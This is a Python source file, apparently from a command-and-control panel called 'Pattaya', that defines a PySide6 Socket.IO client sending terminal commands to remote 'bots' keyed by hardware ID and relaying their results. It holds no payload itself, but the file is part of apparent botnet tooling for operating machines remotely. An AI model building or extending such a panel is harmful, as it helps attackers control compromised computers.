from PySide6.QtCore import QObject, Signal,QSettings
import socketio

from core.util import PattayaPanelUtil


class SocketIOTerminalClient(QObject):

    connected_to_server = Signal(str)
    disconnected_to_server = Signal(str)
    server_ack = Signal(str)
    server_ack_result = Signal(str)
    server_ack_bot_discon = Signal()
    server_ack_bot_not_allow_command = Signal(str)

    def __init__(self, bot):
        super().__init__()

        self.bot = bot
        self.panel_token = QSettings("unknownclub.net", "Pattaya").value('token')
        self.bot_event_ack = f'{self.panel_token}_server_ack_terminal_bot_task_result_{self.bot["hwid"]}'
        self.bot_event_not_allow_command = f'{self.panel_token}_server_ack_not_allow_terminal_bot_task_result_{self.bot["hwid"]}'
        self.bot_event_result = f'{self.panel_token}_panel_terminal_bot_task_result_{self.bot["hwid"]}'
        self.bot_event_bot_discon = f'panel_terminal_bot_seem_disconnected_{self.bot["socketId"]}'

        self.socket_io = socketio.Client()
        self.socket_io.on('connect', self._on_connect)
        self.socket_io.on('disconnect', self._on_disconnect)
        self.socket_io.on(self.bot_event_ack, self._on_server_ack)
        self.socket_io.on(self.bot_event_result, self._on_server_ack_result)
        self.socket_io.on(self.bot_event_bot_discon, self._on_server_ack_bot_discon)
        self.socket_io.on(self.bot_event_not_allow_command, self._on_bot_event_not_allow_command)


    def start(self, url, token, namespace):
        self.url = url
        self.token = token
        self.namespace = namespace
        try:
            self.socket_io.connect(self.url, headers={'Authorization': f'###### {self.token}', 'Content-Type': 'application/json'}, namespaces=self.namespace)
        except Exception as e:
            PattayaPanelUtil.panel_log_error(f'{str(e)}')


    def send_command(self, event, data):
        try:
            self.socket_io.emit(event, data)
        except Exception as e:
            PattayaPanelUtil.panel_log_error(f'{str(e)}')

    def stop(self):
        try:
            self.socket_io.disconnect()
        except Exception as e:
            PattayaPanelUtil.panel_log_error(f'{str(e)}')

    def _on_connect(self):
        self.connected_to_server.emit("Terminal has been connected to Pattaya server!")
        PattayaPanelUtil.panel_log_info("Terminal has been connected to Pattaya server!")
        

    def _on_disconnect(self):
        PattayaPanelUtil.panel_log_info("Terminal has been disconnected to Pattaya server!")
        self.disconnected_to_server.emit("Terminal has been disconnected to Pattaya server!")


    def _on_server_ack(self, data):
       self.server_ack.emit(data['message'])
       PattayaPanelUtil.panel_log_info(f"Terminal receieved server ack")


    def _on_server_ack_result(self, data):
       self.server_ack_result.emit(data['message'])
       PattayaPanelUtil.panel_log_info(f"Terminal receieved bot result from server")

    def _on_server_ack_bot_discon(self):
       self.server_ack_bot_discon.emit()
       PattayaPanelUtil.panel_log_info(f"Seem current bot disconnected from server")

    def _on_bot_event_not_allow_command(self, data):
       self.server_ack_bot_not_allow_command.emit(data['message'])
       PattayaPanelUtil.panel_log_info(f"This panel not allow using current command")

